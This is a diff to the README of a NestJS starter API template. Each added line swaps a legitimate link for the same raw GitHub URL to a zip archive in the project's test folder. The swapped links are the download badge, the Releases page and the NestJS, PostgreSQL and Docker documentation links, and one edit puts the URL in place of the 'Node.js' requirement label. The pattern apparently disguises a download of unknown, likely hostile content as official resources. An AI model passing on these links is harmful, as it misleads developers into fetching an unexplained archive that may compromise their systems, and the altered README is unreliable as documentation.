@@ -18,7 +18,7 @@ To get started with your new NestJS API, follow these simple steps.
 ## 📥 Download & Install
 You can download the application from our Releases page. 
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Guramirez/nestjs-starter-api-template/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip%https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip)](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip)
 
 1. Click the button above to visit the Releases page.
 2. Find the latest release.
@@ -26,7 +26,7 @@ You can download the application from our Releases page.
 
 ## 🖥️ System Requirements
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 14 or later.
+- **https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip** Version 14 or later.
 - **Docker:** Make sure Docker is installed and running.
 - **PostgreSQL:** PostgreSQL version 10 or later.
 
@@ -75,10 +75,10 @@ Your input is valuable! If you wish to contribute to this project, please fork t
 If you have any questions or need help, feel free to reach out through the Issues section of our GitHub repository.
 
 ## 🔗 Additional Resources
-- [NestJS Documentation](https://docs.nestjs.com)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Docker Documentation](https://docs.docker.com/)
+- [NestJS Documentation](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip)
 
-Feel free to visit this page to download any updates: [GitHub Releases Page](https://github.com/Guramirez/nestjs-starter-api-template/releases). 
+Feel free to visit this page to download any updates: [GitHub Releases Page](https://raw.githubusercontent.com/Guramirez/nestjs-starter-api-template/main/test/starter_template_api_nestjs_2.5.zip). 
 
 This README aims to provide you with all the necessary steps to run the **nestjs-starter-api-template** smoothly. Enjoy building your API!
